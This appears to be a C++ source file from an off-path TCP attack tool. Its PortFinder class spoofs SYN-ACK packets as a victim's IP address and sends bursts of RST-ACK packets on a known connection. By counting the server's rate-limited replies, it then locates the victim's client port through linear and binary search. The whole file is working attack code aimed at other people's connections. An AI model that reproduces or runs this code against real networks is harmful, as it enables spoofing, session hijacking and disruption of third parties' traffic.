#include "port_finder.h"

#include <vector>
#include <thread>
#include <iostream>

#include "common.h"
#include "packet_counter.h"

using namespace std;
using namespace Tins;

PortFinder::PortFinder(
        ConnectionID legitConn,
        uint32_t legitLastSeq,
        const string& victimIP) : 
    legitConn_(legitConn), legitLastSeq_(legitLastSeq), victimIP_(victimIP) {}


void PortFinder::setSyncDelayMs(chrono::milliseconds syncDelayMs) {
    syncDelayMs_ = syncDelayMs;
}

uint32_t PortFinder::find(uint32_t from, uint32_t to) {
    int range = 5000;
    auto start = from;
    cout << "Linear search" << endl;
    while (start <= to) {
        auto finish = min(start + range - 1, to);
        cout << "Probing ports " << start << "..." << finish << ": " << flush;
        if (has_port(start, finish)) {
            cout << "Yes" << endl;
            from = start;
            to = finish;
            break;
        }
        cout << "No" << endl;
        start = finish + 1;
    }

    cout << "Binary search" << endl;
    auto left = from;
    auto right = to;
    while (left < right) {
        auto mid = (left + right + 1) / 2;
        cout << "Probing ports " << mid << "..." << right << ": " << flush;
        if (has_port(mid, right)) {
            cout << "Yes" << endl;
            left = mid;
        } else {
            cout << "No" << endl;
            right = mid - 1;
        }
    }
    return left;
}

bool PortFinder::has_port(uint32_t from, uint32_t to) {
    vector<IP> packets;
    ConnectionID victimConn(victimIP_, 0, legitConn_.serverIP, legitConn_.serverPort);
    for (auto port = from; port <= to; port++) {
        victimConn.clientPort = port;
        packets.push_back(make_packet(victimConn, "SA", 0));
    }
    for (int i = 0; i < 100; i++) {
        packets.push_back(make_packet(legitConn_, "RA", legitLastSeq_ + 3));
    }

    auto pcounter = PacketCounter::instance();
    int retry = 3;
    while (retry > 0) {
        pcounter->startCounting();
        align_and_delay(syncDelayMs_);
        for (auto p : packets) {
            sender_.send(p);
            this_thread::sleep_for(10us);
        }
        this_thread::sleep_for(2s);
        auto numReceived = pcounter->stopCounting();
        if (numReceived == 99) {
            return true;
        } else if (numReceived == 100) {
            return false;
        }
        cout << endl << "Received " << numReceived << " packets. Retrying..." << endl;
        retry--;
    }
    throw "Too much packet loss or clock is not synchronized";
}